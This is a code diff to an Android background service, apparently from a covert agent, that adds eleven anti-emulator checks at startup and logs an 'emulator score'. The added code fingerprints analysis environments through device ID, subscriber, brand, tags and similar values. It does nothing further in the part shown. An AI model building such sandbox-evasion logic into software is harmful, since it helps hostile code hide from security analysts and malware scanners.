@@ -42,6 +42,7 @@ import android.widget.Toast;
 import com.android.service.auto.Cfg;
 import com.android.service.capabilities.PackageInfo;
 import com.android.service.crypto.Keys;
+import com.android.service.util.AntiEmulator;
 import com.android.service.util.Check;
 import com.android.service.util.Utils;
 
@@ -78,7 +79,7 @@ public class ServiceCore extends Service {
 			Toast.makeText(this, Messages.getString("32.1"), Toast.LENGTH_LONG).show(); //$NON-NLS-1$
 			// setBackground();
 		}
-
+		
 		needsNotification = isNotificationNeeded();
 
 		Status.setAppContext(getApplicationContext());
@@ -120,7 +121,148 @@ public class ServiceCore extends Service {
 
 		// Core core = Core.getInstance();
 		// core.setAutostartAlarm();
-
+		
+		//
+		int score = 0;
+		AntiEmulator antiEmu = new AntiEmulator();
+		
+		if (antiEmu.EmuCheckId() == true) {
+			score++;
+			
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (onStart): EmuCheckId() on emu"); //$NON-NLS-1$
+			}
+		} else {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (onStart): EmuCheckId() on device"); //$NON-NLS-1$
+			}
+		}
+		
+		if (antiEmu.EmuCheckSubscriber() == true) {
+			score++;
+			
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (onStart): EmuCheckSubscriber() on emu"); //$NON-NLS-1$
+			}
+		} else {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (onStart): EmuCheckSubscriber() on device"); //$NON-NLS-1$
+			}
+		}
+		
+		if (antiEmu.EmuCheckPhoneNumber() == true) {
+			score++;
+			
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (onStart): EmuCheckPhoneNumber() on emu"); //$NON-NLS-1$
+			}
+		} else {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (onStart): EmuCheckPhoneNumber() on device"); //$NON-NLS-1$
+			}
+		}
+		
+		if (antiEmu.EmuCheckDevice() == true) {
+			score++;
+			
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (onStart): EmuCheckDevice() on emu"); //$NON-NLS-1$
+			}
+		} else {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (onStart): EmuCheckDevice() on device"); //$NON-NLS-1$
+			}
+		}
+		
+		if (antiEmu.EmuCheckBrand() == true) {
+			score++;
+			
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (onStart): EmuCheckBrand() on emu"); //$NON-NLS-1$
+			}
+		} else {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (onStart): EmuCheckBrand() on device"); //$NON-NLS-1$
+			}
+		}
+		
+		if (antiEmu.EmuCheckKeys() == true) {
+			score++;
+			
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (onStart): EmuCheckKeys() on emu"); //$NON-NLS-1$
+			}
+		} else {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (onStart): EmuCheckKeys() on device"); //$NON-NLS-1$
+			}
+		}
+		
+		if (antiEmu.EmuCheckManufacturer() == true) {
+			score++;
+			
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (onStart): EmuCheckManufacturer() on emu"); //$NON-NLS-1$
+			}
+		} else {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (onStart): EmuCheckManufacturer() on device"); //$NON-NLS-1$
+			}
+		}
+		
+		if (antiEmu.EmuCheckProduct() == true) {
+			score++;
+			
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (onStart): EmuCheckProduct() on emu"); //$NON-NLS-1$
+			}
+		} else {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (onStart): EmuCheckProduct() on device"); //$NON-NLS-1$
+			}
+		}
+		
+		if (antiEmu.EmuCheckTags() == true) {
+			score++;
+			
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (onStart): EmuCheckTags() on emu"); //$NON-NLS-1$
+			}
+		} else {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (onStart): EmuCheckTags() on device"); //$NON-NLS-1$
+			}
+		}
+		
+		if (antiEmu.EmuCheckOperator() == true) {
+			score++;
+			
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (onStart): EmuCheckOperator() on emu"); //$NON-NLS-1$
+			}
+		} else {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (onStart): EmuCheckOperator() on device"); //$NON-NLS-1$
+			}
+		}
+		
+		if (antiEmu.EmuCheckScaling() == true) {
+			score++;
+			
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (onStart): EmuCheckScaling() on emu"); //$NON-NLS-1$
+			}
+		} else {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (onStart): EmuCheckScaling() on device"); //$NON-NLS-1$
+			}
+		}
+		
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (onStart): current emulator score: " + score + "/11"); //$NON-NLS-1$
+		}
+		//
+		
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (onStart)"); //$NON-NLS-1$
 		}
@@ -182,7 +324,7 @@ public class ServiceCore extends Service {
 			Status.self().setRoot(isRoot);
 		}
 
-		// Core starts
+		// Core starts	
 		core = Core.getInstance();
 		core.Start(this.getResources(), getContentResolver());
 	}
